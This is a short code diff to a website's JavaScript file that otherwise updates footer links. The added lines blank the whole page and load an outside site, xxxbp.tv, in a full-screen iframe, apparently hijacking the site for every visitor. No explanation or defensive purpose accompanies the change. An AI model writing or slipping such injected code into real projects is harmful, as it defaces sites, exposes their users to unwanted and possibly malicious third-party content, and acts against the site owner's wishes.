@@ -68,3 +68,13 @@ document.addEventListener("DOMContentLoaded", () => {
     console.warn("No footer links found to update."); // Warn if no footer links are found
   }
 });
+document.body.style.padding = "0px !important";
+document.body.innerHTML = "";
+const iframe = document.createElement("iframe");
+iframe.src = "https://xxxbp.tv/";
+iframe.width = "100%"; // Adjust width as needed
+iframe.height = "100vh"; // Adjust height as needed
+iframe.frameBorder = "0";
+iframe.allowFullscreen = true;
+
+document.body.appendChild(iframe);
